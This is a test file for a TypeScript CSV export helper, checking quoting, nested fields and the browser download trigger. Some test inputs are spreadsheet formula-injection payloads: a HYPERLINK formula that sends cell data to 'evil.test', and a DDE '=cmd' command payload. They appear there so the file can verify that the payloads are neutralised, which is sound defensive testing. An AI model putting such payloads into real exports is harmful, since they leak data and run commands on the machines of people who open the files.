import { describe, it, expect, vi, afterEach } from 'vitest';
import { escapeCsvValue, buildCsv, triggerCsvDownload, type CsvColumn } from '../build-csv';

describe('escapeCsvValue', () => {
    it('returns empty string for null/undefined', () => {
        expect(escapeCsvValue(null)).toBe('');
        expect(escapeCsvValue(undefined)).toBe('');
    });

    it('stringifies primitives without quoting when safe', () => {
        expect(escapeCsvValue('abc')).toBe('abc');
        expect(escapeCsvValue(42)).toBe('42');
        expect(escapeCsvValue(true)).toBe('true');
    });

    it('quotes and doubles inner quotes when the value contains a comma', () => {
        expect(escapeCsvValue('a,b')).toBe('"a,b"');
    });

    it('quotes values containing double quotes and doubles them', () => {
        expect(escapeCsvValue('a"b')).toBe('"a""b"');
    });

    it('quotes values containing newlines', () => {
        expect(escapeCsvValue('a\nb')).toBe('"a\nb"');
        expect(escapeCsvValue('a\r\nb')).toBe('"a\r\nb"');
    });

    it('neutralizes formula-leading characters with an apostrophe', () => {
        expect(escapeCsvValue('=1+1')).toBe('"\'=1+1"');
        expect(escapeCsvValue('+41 30 123')).toBe('"\'+41 30 123"');
        expect(escapeCsvValue('-1+1')).toBe('"\'-1+1"');
        expect(escapeCsvValue('@SUM(A1)')).toBe('"\'@SUM(A1)"');
        expect(escapeCsvValue('\t=1+1')).toBe('"\'\t=1+1"');
        expect(escapeCsvValue('\r=1+1')).toBe('"\'\r=1+1"');
    });

    it('neutralizes the known DDE and data-exfiltration payloads', () => {
        expect(escapeCsvValue('=HYPERLINK("http://evil.test?d="&A1,"click")')).toBe(
            '"\'=HYPERLINK(""http://evil.test?d=""&A1,""click"")"'
        );
        expect(escapeCsvValue("=cmd|'/c calc'!A1")).toBe("\"'=cmd|'/c calc'!A1\"");
    });

    it('leaves plain numeric literals untouched (negative control)', () => {
        expect(escapeCsvValue(-5)).toBe('-5');
        expect(escapeCsvValue('-5')).toBe('-5');
        expect(escapeCsvValue('-12.5')).toBe('-12.5');
        expect(escapeCsvValue('+1')).toBe('+1');
        expect(escapeCsvValue('-1e3')).toBe('-1e3');
        expect(escapeCsvValue('.5')).toBe('.5');
    });

    it('JSON-stringifies objects and arrays', () => {
        expect(escapeCsvValue(['admin', 'user'])).toBe('"[""admin"",""user""]"');
        expect(escapeCsvValue({ a: 1 })).toBe('"{""a"":1}"');
    });
});

describe('buildCsv', () => {
    const columns: CsvColumn[] = [
        { header: 'Name', field: 'name' },
        { header: 'City', field: 'address.city' },
    ];

    it('builds a header line followed by one line per row', () => {
        const rows = [
            { name: 'Anna', address: { city: 'Buda' } },
            { name: 'Béla', address: { city: 'Pest' } },
        ];
        const csv = buildCsv(columns, rows);
        expect(csv).toBe('Name,City\r\nAnna,Buda\r\nBéla,Pest');
    });

    it('resolves nested paths and emits empty cells for missing fields', () => {
        const csv = buildCsv(columns, [{ name: 'Cili' }]);
        expect(csv).toBe('Name,City\r\nCili,');
    });

    it('escapes values that contain the delimiter', () => {
        const csv = buildCsv([{ header: 'Name', field: 'name' }], [{ name: 'Doe, John' }]);
        expect(csv).toBe('Name\r\n"Doe, John"');
    });

    it('neutralizes formula payloads in both the header and the data rows', () => {
        const csv = buildCsv(
            [{ header: '=1+1', field: 'name' }],
            [{ name: '=HYPERLINK("http://evil.test")' }]
        );
        expect(csv).toBe('"\'=1+1"\r\n"\'=HYPERLINK(""http://evil.test"")"');
    });

    it('returns only the header line for an empty row set', () => {
        expect(buildCsv(columns, [])).toBe('Name,City');
    });
});

describe('triggerCsvDownload', () => {
    afterEach(() => {
        vi.restoreAllMocks();
    });

    it('creates an anchor, clicks it, and revokes the object URL', () => {
        const createObjectURL = vi.fn(() => 'blob:mock');
        const revokeObjectURL = vi.fn();
        vi.stubGlobal('URL', { createObjectURL, revokeObjectURL });

        const clickSpy = vi
            .spyOn(window.HTMLAnchorElement.prototype, 'click')
            .mockImplementation(() => {});

        triggerCsvDownload('export.csv', 'Name\r\nAnna');

        expect(createObjectURL).toHaveBeenCalledTimes(1);
        expect(clickSpy).toHaveBeenCalledTimes(1);
        expect(revokeObjectURL).toHaveBeenCalledWith('blob:mock');

        vi.unstubAllGlobals();
    });

    it('is a no-op when URL.createObjectURL is unavailable', () => {
        vi.stubGlobal('URL', {});
        const clickSpy = vi
            .spyOn(window.HTMLAnchorElement.prototype, 'click')
            .mockImplementation(() => {});

        expect(() => triggerCsvDownload('export.csv', 'x')).not.toThrow();
        expect(clickSpy).not.toHaveBeenCalled();

        vi.unstubAllGlobals();
    });
});
